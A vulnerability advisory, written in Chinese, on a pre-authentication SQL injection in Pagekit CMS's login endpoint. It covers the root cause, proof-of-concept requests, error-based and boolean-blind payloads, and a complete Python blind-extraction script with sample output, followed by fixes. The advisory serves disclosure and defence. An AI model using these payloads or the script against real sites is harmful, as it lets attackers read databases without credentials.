# Pagekit CMS <= 1.0.18 **在用户认证过程中存在 SQL 注入漏洞**

## 摘要(Summary)

Pagekit CMS(<= 1.0.18,最终版本)允许**未认证**攻击者通过提交到公开登录接口(`POST /user/authenticate`)的 `credentials` 数组执行 SQL 注入。攻击者提交的数组**键**被框架的查询构造器原样拼接到 SQL 的 `WHERE` 子句中。根据部署配置不同,攻击者可使用两种提取模式:

- **开启 debug**(`application.debug = true`):报错注入在 HTTP 响应中返回完整的执行 SQL 语句和数据库错误消息,可以**直接、即时**提取任意数据库内容(库名、表、列、行数据);
- **关闭 debug**(默认生产配置):布尔盲注依然完全可利用,可将任意布尔 SQL 表达式转换为 HTTP 500 与 401 的响应差异,通过自动化二分搜索逐字符提取数据。

两种情况下攻击者都无需任何凭据即可提取整个数据库。

## 详情(Details)

该漏洞由"未校验的控制器参数"与"框架级查询构造器汇聚点对标识符不做中和"两者叠加造成:

1. **控制器入口** — `AuthController::authenticateAction()` 声明 `@Request({"credentials": "array", ...})`,从请求体接受攻击者可控的嵌套数组
   (`app/system/modules/user/src/Controller/AuthController.php:50-62`)。该路由可被公众直接访问,且显式标注 `_maintenance=true`(维护模式下依然可达)。

2. **透传至 ORM** — `Auth::authenticate()` 将该数组原样传给用户提供器
   (`app/modules/auth/src/Auth.php:119-123`)。

3. **未消毒的转发** — `UserProvider::findByCredentials()` 仅删除 `password` 键,将其余攻击者可控数组直接传入 `User::where($credentials)`
   (`app/system/modules/user/src/Auth/UserProvider.php:46-53`)。

4. **注入汇聚点(根因)** — `QueryBuilder::addWhere()` 将字符串数组**键**原样嵌入 SQL 字符串,并将**数字键的值**当作原始 SQL 片段使用;只有命名占位符的名字做了清洗,且仅等号右侧的值做了参数绑定
   (`app/modules/database/src/Query/QueryBuilder.php:282-293`):

   ```php
   foreach ($condition as $key => $value) {
       if (!is_numeric($key)) {
           $name          = $this->parameter($key);   // 仅占位符名被清洗
           $params[$name] = $value;
           $value         = "$key = :$name";          // $key 原样注入 SQL
       }
       $args[] = $value;                              // 数字键的值被当作原始 SQL 使用
   }
   ```

该接口有 CSRF token 保护,但这不构成实质性障碍:token 是随公开登录页下发的会话级值,攻击者只需用自己的会话先请求一次登录页即可获得。

## 概念验证(Proof of Concept)

### 第 0 步 —— 获取会话 Cookie 和 CSRF token

利用需要一个有效的会话 Cookie 和配套的 CSRF token。二者通过一次未认证的 GET 请求访问公开登录页即可同时获得:

```
GET /user/login HTTP/1.1
Host: <目标>
```

- 响应的 `Set-Cookie` 头携带会话 Cookie(通常为 `pk_session_id=...`);
- 响应 HTML 中的隐藏表单域包含 token:

  ```html
  <input type="hidden" name="_csrf" value="baef75eb4b4569d525913789b3918f4ea2e5648a">
  ```

  提取 `input[name="_csrf"]` 元素的 `value` 属性即可。

注意事项:该 token **不是单次有效**——在整个会话生命周期内持续有效,可跨请求复用。将下文请求中的 `<会话 Cookie>` 和 `<token>` 替换为上述值。此外,每个请求应使用**不同的随机 `credentials[username]`** 值:这既能避免 (a) 按用户名累积失败次数的登录限速器,也能避免 (b) 失败处理器中另一个 `Undefined index: username` 缺陷——否则每个失败请求都会变成无关的 HTTP 500。

### 注入存在性验证(任何配置下)

注入语法错误的 SQL 片段即可区分注入与正常登录失败(HTTP 500 = 注入片段到达 SQL 层;401 = 正常登录失败):

```
POST /user/authenticate HTTP/1.1
Host: <目标>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: <会话 Cookie>

credentials[username]=x&credentials[0]=)))---&credentials[password]=wrongpw&_csrf=<token>
```

### 开启 debug —— 直接报错注入提取

当 `application.debug` 开启时,框架渲染的异常页带完整 SQL 语句和底层数据库错误,数据直接返回在响应体中:

```
credentials[0] = 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))
```

实测响应(测试环境):

```
An exception occurred while executing
'SELECT * FROM <前缀>system_user WHERE 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())) LIMIT 1':
SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~pagekit'
```

同一模式(`EXTRACTVALUE` / `UPDATEXML` 配 `CONCAT`)可提取任意标量表达式——`information_schema` 中的表名、列值等——每请求一条,无需枚举成本。

### 关闭 debug —— 布尔盲注提取(默认生产配置)

debug 关闭时错误细节被抑制,但错误仍在内部发生。注入条件报错 gadget 可将任意布尔 SQL 表达式转换为响应状态差异:

```
credentials[0] = 1=1 AND IF((<条件>),EXP(~0),1)
```

- `EXP(~0)` 触发 MySQL 1690 错误(DOUBLE 值溢出),**仅当 `<条件>` 为真时**(MySQL 的 `IF()` 为惰性求值)→ HTTP 500
- 条件为假时查询正常完成 → HTTP 401

实测探针示例(debug 关闭):

| 注入条件 | 响应 | 含义 |
|---|---|---|
| `LENGTH(DATABASE())=7` | 500 | 库名长度为 7 |
| `LENGTH(DATABASE())=99` | 401 | 条件为假 |
| `ASCII(SUBSTRING(DATABASE(),1,1))=112` | 500 | 首字符为 `p` |
| `ASCII(SUBSTRING(DATABASE(),1,1))=113` | 401 | 条件为假 |

基于该 oracle 的自动化二分提取约每字符 7 个请求(提取库名共 54 个请求)。由于注入条件可引用任意子查询,该 oracle 可提取**数据库中任何表**的数据。

### 自动化 PoC 脚本

`pagekit_sqli_dbname.py`(Python 3,依赖 `requests`)实现了针对 debug 关闭目标的完整盲注提取链:会话/CSRF 引导、oracle 自检、长度二分、逐字符二分。默认提取当前数据库名;`--expr` 可指定任意标量 SQL 表达式。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pagekit CMS <= 1.0.18 unauthenticated SQL injection blind extraction PoC.
Target: POST /user/authenticate (credentials array key injected into WHERE).
Oracle: IF((cond),EXP(~0),1) -> true: MySQL error 1690 / HTTP 500, false: HTTP 401.
Usage:  python pagekit_sqli_dbname.py --url http://target
Authorized testing only.
"""

import argparse
import random
import re
import string
import sys
import time

import requests


def rand_user():
    return "u_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))


class PagekitBlind:
    FMT = "1=1 AND IF(({cond}),EXP(~0),1)"

    def __init__(self, url, delay=0.05):
        self.url = url.rstrip("/") + "/user/authenticate"
        self.delay = delay
        self.sess = requests.Session()
        self.csrf = None
        self.count = 0

    def token(self):
        r = self.sess.get(self.url.replace("/user/authenticate", "/user/login"))
        self.csrf = re.search(r'name="_csrf" value="([^"]+)"', r.text).group(1)

    def ask(self, cond):
        payload = self.FMT.format(cond=cond)
        for _ in range(2):
            self.count += 1
            data = {
                "credentials[username]": rand_user(),
                "credentials[0]": payload,
                "credentials[password]": "x",
                "_csrf": self.csrf or "",
            }
            r = self.sess.post(self.url, data=data,
                               headers={"X-Requested-With": "XMLHttpRequest"})
            if r.status_code == 401 and r.text.strip().startswith("{"):
                try:
                    self.csrf = r.json()["csrf"]
                    continue
                except ValueError:
                    pass
            return r.status_code == 500
        return False

    def length(self, expr, upper=64):
        lo, hi = 0, upper
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask("LENGTH(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
            time.sleep(self.delay)
        return lo

    def value(self, expr):
        n = self.length(expr)
        print("[*] length = %d" % n)
        out = ""
        for pos in range(1, n + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask("ASCII(SUBSTRING(%s,%d,1))>%d" % (expr, pos, mid)):
                    lo = mid + 1
                else:
                    hi = mid
                time.sleep(self.delay)
            out += chr(lo)
            print("[+] %s" % out)
        return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url")
    ap.add_argument("--expr", default="DATABASE()")
    ap.add_argument("--delay", type=float, default=0.05)
    args = ap.parse_args()

    b = PagekitBlind(args.url, args.delay)
    b.token()
    assert b.ask("1=1"), "oracle check failed (expected 500 on true)"
    assert not b.ask("1=2"), "oracle check failed (expected 401 on false)"
    print("[*] oracle OK (true=500 / false=401)")

    t0 = time.time()
    result = b.value(args.expr)
    print("-" * 40)
    print("[+] %s = %r" % (args.expr, result))
    print("[*] %d requests, %.1fs" % (b.count, time.time() - t0))


if __name__ == "__main__":
    main()
```

实测输出(测试环境,`debug=false`):

```
[*] oracle OK (true=500 / false=401)
[*] length = 7
[+] p
[+] pa
[+] pag
[+] page
[+] pagek
[+] pageki
[+] pagekit
----------------------------------------
[+] DATABASE() = 'pagekit'
[*] 54 requests, 23.4s
```

**边界说明(供准确评估影响)**:**无法绕过认证**——命中用户行后仍会执行 `password_verify()`。注入被限制在单条 SELECT 语句内(无堆叠查询),因此影响限于机密性(全库读取)。

## 影响(Impact)

- **未认证**:无需任何账号或前置权限
- **机密性 — 高**:debug 开启时可报错注入直接提取任意数据库内容;debug 关闭(默认)时可布尔盲注提取——无论哪种方式都可还原整个数据库
- 站点处于维护模式时依然可达(路由标注 `_maintenance`)
- 受影响代码路径位于框架层(`QueryBuilder::addWhere()`),当前及未来的任何调用者只要把用户可控的数组/键传给 `where()` 都会继承同一汇聚点

## 修复建议(Remediation)

不存在已修复版本(项目停止维护)。建议的缓解措施:

```php
// UserProvider::findByCredentials —— 白名单化凭据键
$credentials = array_intersect_key($credentials, ['username' => 1, 'email' => 1]);
$credentials = array_filter($credentials, 'is_scalar');
return User::where($credentials)->first();
```

框架级加固(建议,可消除整类汇聚点):在 `QueryBuilder::addWhere()` 中拒绝非白名单键,且禁止将数字键的值作为原始 SQL 片段拼接。未修复环境的运维方应确保生产环境关闭 `application.debug`,在 WAF 上拦截/审查 `credentials[` 数组键模式,并尽快迁移到仍在维护的项目。

## 相关公告

- **CVE-2021-44135 ** — 此前唯一公开的 Pagekit SQL 注入——是一个**不同的、需认证**的问题:经 `SettingsController::configAction()` 保存的评论列表排序配置造成的 ORDER BY 注入。本公告涉及的是公开登录接口上由 `QueryBuilder::addWhere()` 数组键拼接造成的**认证前**注入。此前公告未描述过 `addWhere()` 汇聚点,也未涉及认证向量。

## 参考(References)

- `app/system/modules/user/src/Controller/AuthController.php`(请求入口)
- `app/modules/auth/src/Auth.php`(透传)
- `app/system/modules/user/src/Auth/UserProvider.php`(未消毒转发)
- `app/modules/database/src/Query/QueryBuilder.php`(注入汇聚点)
- [CVE Record: CVE-2021-44135](https://www.cve.org/CVERecord?id=CVE-2021-44135)(去重参考)
- [pagekit/pagekit: Pagekit CMS](https://github.com/pagekit/pagekit)
